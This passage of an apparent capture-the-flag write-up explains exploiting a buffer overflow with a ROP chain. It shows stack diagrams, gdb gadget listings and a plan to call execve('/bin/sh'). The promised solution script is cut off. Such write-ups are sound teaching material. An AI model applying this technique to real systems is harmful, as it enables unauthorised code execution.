<p>What we need to do is, because we control the stack due to the buffer overflow bug, we will try to carefully choose some available instructions in the binary (called <code>gadgets</code>), which can be used to build our shellcode. Usually, what we&rsquo;re looking for is an instruction that can pop a stack value (which we can control) to chosen register (such as <code>rdi</code>, <code>rsp</code>, <code>rsi</code>, <code>rax</code>, etc.), and it usually ends with <code>ret</code> instruction, so that we can jump to another chosen instruction that we have put in the stack.</p>
<p>For example, imagine that we have a buffer overflow bug in method X:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Now because of our malicious input, the stack layout become like below:
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| aaaaaaaa                         | &lt;- RSP, top of stack
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| ........                         |
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| Saved RBP                        | &lt;- RBP
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| Address of gadget &#34;pop rdi; ret&#34; | &lt;- Stack Return Pointer address after being overwritten
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| desired rdi value                |
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>When the method X is finished and want to jump to the previous callee by calling `leave; ret;`, the stack flow will be like below:
</span></span><span style="display:flex;"><span>After &#34;leave&#34;, stack will be like below:
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| Address of gadget &#34;pop rdi; ret&#34; | &lt;- RSP. Stack Return Pointer address after being overwritten
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| desired rdi value                | &lt;- This value will be popped to rdi
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>During executing &#34;ret&#34;, program will do &#34;pop rip&#34;, which basically make the program jump
</span></span><span style="display:flex;"><span>to the address stored in top of stack, which is &#34;pop rdi; ret&#34;. Now the stack is like below:
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| desired rdi value                | &lt;- RSP. This value will be popped to rdi
</span></span><span style="display:flex;"><span>|----------------------------------|
</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Now, during executing &#34;pop rdi&#34;, it will pop top of stack to rdi. Now stack is like below:
</span></span><span style="display:flex;"><span>Lower Address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      | &lt;- RSP. Next return pointer address
</span></span><span style="display:flex;"><span> ----------------------------------
</span></span><span style="display:flex;"><span>Higher Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>And now, &#34;ret&#34; will do &#34;pop rip&#34;, which make the program jump to the stored address
</span></span><span style="display:flex;"><span>in RSP , which is syscall.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Now, We finally able to do RCE leveraging BOF bug.
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see in the above example, with buffer overflow, we can do RCE via ROP to execute our desired execution.</p>
<p>So, the last step is only to build a ROP chain. Inspecting via gdb, we notice that the 7th <code>rand()</code> address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We also notice in the 2nd <code>rand()</code> address region, there is <code>syscall</code> gadget.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// Lot of useful gadgets found in 7th address region
</span></span><span style="display:flex;"><span>gef‚û§  x/25i 0x00000f0b001000
</span></span><span style="display:flex;"><span>   0xf0b001000:	push   rdi
</span></span><span style="display:flex;"><span>   0xf0b001001:	pop    rdi
</span></span><span style="display:flex;"><span>   0xf0b001002:	ret    
</span></span><span style="display:flex;"><span>   0xf0b001003:	push   rdi
</span></span><span style="display:flex;"><span>   0xf0b001004:	pop    rsi
</span></span><span style="display:flex;"><span>   0xf0b001005:	ret    
</span></span><span style="display:flex;"><span>   0xf0b001006:	push   rdi
</span></span><span style="display:flex;"><span>   0xf0b001007:	pop    rax
</span></span><span style="display:flex;"><span>   0xf0b001008:	ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Syscall found in 2nd address region
</span></span><span style="display:flex;"><span>gef‚û§  x/10i 0x0000f900001000
</span></span><span style="display:flex;"><span>   0xf900001000:	mov    eax,edi
</span></span><span style="display:flex;"><span>   0xf900001002:	syscall 
</span></span><span style="display:flex;"><span>   0xf900001004:	ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>We plan to use these gadgets to do syscall <code>execve('/bin/sh')</code>. The rough plan is to build a ROP chain to do this:</p>
<ul>
<li>pop &ldquo;/bin/sh\x00&rdquo; pointer to <code>rdi</code></li>
<li>pop null to <code>rsi</code></li>
<li>pop <code>execve</code> syscall number (0x3b) to <code>rax</code></li>
<li>call <code>syscall</code></li>
</ul>
<h3 id="solution">Solution <a href="#solution" class="anchor">#</a></h3>
<p>Following the above exploitation plan, below is the full script that I used to execute the plan. I&rsquo;ve provided detailed comments to explain what the script does.</p>
<blockquote>
<p>Notes that sometimes z3 couldn&rsquo;t recover the correct <code>canary</code> value, but we simply retry it, and at somepoint, it will be able to recover the correct <code>canary</code>.</p>
</blockquote>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
